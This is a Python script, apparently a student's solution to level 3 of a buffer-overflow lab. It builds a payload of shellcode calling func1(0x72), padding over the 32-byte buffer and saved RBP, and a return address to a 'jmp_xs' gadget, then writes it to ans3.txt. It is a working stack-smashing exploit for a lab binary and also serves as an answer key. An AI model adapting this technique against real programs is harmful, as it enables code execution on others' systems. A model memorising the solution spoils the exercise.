import struct

# 1. 构造 Shellcode (让机器执行的代码)
# 目标: func1(114) -> func1(0x72)
shellcode = (
    b'\xbf\x72\x00\x00\x00'  # mov edi, 0x72
    b'\xb8\x16\x12\x40\x00'  # mov eax, 0x401216
    b'\xff\xd0'              # call rax
)

# 2. 计算填充
# Buffer 大小是 32 字节 (rbp-0x20 到 rbp)
# Shellcode 长度是 12 字节
# 剩下的空间用 'A' 填满
pad_length = 32 - len(shellcode)
padding_buffer = b'A' * pad_length

# 3. 覆盖 Saved RBP (8字节)
padding_rbp = b'B' * 8

# 4. 覆盖返回地址
# 我们用 jmp_xs 的地址 (0x401334)
# 这个函数会帮我们跳转回缓冲区的开头，执行 Shellcode
ret_addr = struct.pack('<Q', 0x401334)

# 5. 组合 Payload
# [Shellcode] + [Padding] + [Saved RBP] + [jmp_xs Address]
payload = shellcode + padding_buffer + padding_rbp + ret_addr

# 6. 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload (长度 {len(payload)}) 已写入 ans3.txt")
